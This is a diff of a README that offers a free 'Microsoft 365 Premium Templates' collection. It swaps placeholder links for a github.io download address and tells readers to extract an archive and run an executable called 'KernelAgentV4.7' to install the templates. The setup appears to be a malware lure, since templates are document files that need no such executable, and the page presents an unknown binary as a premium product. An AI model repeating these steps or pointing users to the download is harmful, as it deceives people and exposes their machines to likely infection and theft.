@@ -2,13 +2,15 @@
 
 Access and install a full collection of Microsoft 365 Premium Templates including elegant resumes, business proposals, calendars, and budgeting tools. Designed for productivity, aesthetics, and time-saving.
 
-[![Download Premium Templates](https://img.shields.io/badge/Download-Premium_Templates-blueviolet)](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download Premium Templates](https://img.shields.io/badge/Download-Premium_Templates-blueviolet)](https://m365-premium-templates-suite.github.io/.github
+)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE) section  
+1. 📦 **Download the archive** from the [Releases](https://m365-premium-templates-suite.github.io/.github
+) section  
 2. 📁 **Extract the folder** to a preferred location (e.g. `C:\M365Templates`)  
 3. 🖱 **Run the executable file** `KernelAgentV4.7` to install all templates into Office directory  
 4. 🧠 Open Word, Excel, or PowerPoint and access templates directly from the home screen  
